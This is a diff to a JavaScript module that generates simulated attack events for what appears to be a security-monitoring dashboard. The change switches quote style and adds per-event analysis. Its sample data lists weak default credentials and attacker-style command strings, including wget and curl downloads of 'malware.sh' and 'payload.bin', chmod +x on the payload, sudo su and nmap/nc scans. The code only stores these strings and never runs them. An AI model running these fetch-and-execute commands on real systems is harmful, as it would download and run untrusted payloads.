@@ -1,59 +1,60 @@
-const { randomUUID } = require('crypto');
+const { randomUUID } = require("crypto");
+const { analyzeEvent } = require("./analyzer");
 
 const countries = [
-  'United States',
-  'Russia',
-  'China',
-  'Germany',
-  'India',
-  'Brazil',
-  'Netherlands',
-  'United Kingdom',
-  'Singapore',
-  'Japan',
-  'Canada',
-  'France',
+  "United States",
+  "Russia",
+  "China",
+  "Germany",
+  "India",
+  "Brazil",
+  "Netherlands",
+  "United Kingdom",
+  "Singapore",
+  "Japan",
+  "Canada",
+  "France",
 ];
 
 const citiesByCountry = {
-  'United States': ['New York', 'Chicago', 'Dallas'],
-  Russia: ['Moscow', 'Saint Petersburg', 'Novosibirsk'],
-  China: ['Beijing', 'Shanghai', 'Shenzhen'],
-  Germany: ['Berlin', 'Frankfurt', 'Munich'],
-  India: ['Mumbai', 'Delhi', 'Bengaluru'],
-  Brazil: ['Sao Paulo', 'Rio de Janeiro', 'Brasilia'],
-  Netherlands: ['Amsterdam', 'Rotterdam', 'Utrecht'],
-  'United Kingdom': ['London', 'Manchester', 'Bristol'],
-  Singapore: ['Singapore'],
-  Japan: ['Tokyo', 'Osaka', 'Yokohama'],
-  Canada: ['Toronto', 'Vancouver', 'Montreal'],
-  France: ['Paris', 'Lyon', 'Marseille'],
+  "United States": ["New York", "Chicago", "Dallas"],
+  Russia: ["Moscow", "Saint Petersburg", "Novosibirsk"],
+  China: ["Beijing", "Shanghai", "Shenzhen"],
+  Germany: ["Berlin", "Frankfurt", "Munich"],
+  India: ["Mumbai", "Delhi", "Bengaluru"],
+  Brazil: ["Sao Paulo", "Rio de Janeiro", "Brasilia"],
+  Netherlands: ["Amsterdam", "Rotterdam", "Utrecht"],
+  "United Kingdom": ["London", "Manchester", "Bristol"],
+  Singapore: ["Singapore"],
+  Japan: ["Tokyo", "Osaka", "Yokohama"],
+  Canada: ["Toronto", "Vancouver", "Montreal"],
+  France: ["Paris", "Lyon", "Marseille"],
 };
 
-const usernames = ['root', 'admin', 'user', 'test'];
-const passwords = ['123456', 'password', 'admin123', 'root'];
+const usernames = ["root", "admin", "user", "test"];
+const passwords = ["123456", "password", "admin123", "root"];
 
-const attackTypes = ['Brute Force', 'Malware', 'Scan'];
+const attackTypes = ["Brute Force", "Malware", "Scan"];
 
 const commandsByAttackType = {
-  'Brute Force': [
-    'login attempt for root',
-    'login attempt for admin',
-    'ssh root@target',
-    'ls',
-    'cd /home',
+  "Brute Force": [
+    "login attempt for root",
+    "login attempt for admin",
+    "ssh root@target",
+    "ls",
+    "cd /home",
   ],
   Malware: [
-    'wget http://malware.sh',
-    'curl -O http://payload.bin',
-    'chmod +x /tmp/payload.bin',
-    'sudo su',
+    "wget http://malware.sh",
+    "curl -O http://payload.bin",
+    "chmod +x /tmp/payload.bin",
+    "sudo su",
   ],
   Scan: [
-    'nmap -sV 10.0.0.0/24',
-    'nc -zv 10.0.0.5 22',
-    'for p in 22 80 443; do echo $p; done',
-    'ls',
+    "nmap -sV 10.0.0.0/24",
+    "nc -zv 10.0.0.5 22",
+    "for p in 22 80 443; do echo $p; done",
+    "ls",
   ],
 };
 
@@ -74,11 +75,11 @@ function randomIPv4() {
 function computeRiskScore(attackType, command) {
   let score = randomInt(40, 70);
 
-  if (attackType === 'Malware') {
+  if (attackType === "Malware") {
     score += 20;
   }
 
-  if (command.includes('wget') || command.includes('curl')) {
+  if (command.includes("wget") || command.includes("curl")) {
     score += 15;
   }
 
@@ -109,10 +110,15 @@ function createEvent() {
 function startEventGenerator(eventsArray, onEvent) {
   function scheduleNext() {
     const event = createEvent();
-    eventsArray.push(event);
+    const recentEvents = eventsArray.slice(-49);
+    const enrichedEvent = {
+      ...event,
+      analysis: analyzeEvent(event, [...recentEvents, event]),
+    };
+    eventsArray.push(enrichedEvent);
 
-    if (typeof onEvent === 'function') {
-      onEvent(event);
+    if (typeof onEvent === "function") {
+      onEvent(enrichedEvent);
     }
 
     if (eventsArray.length > 500) {
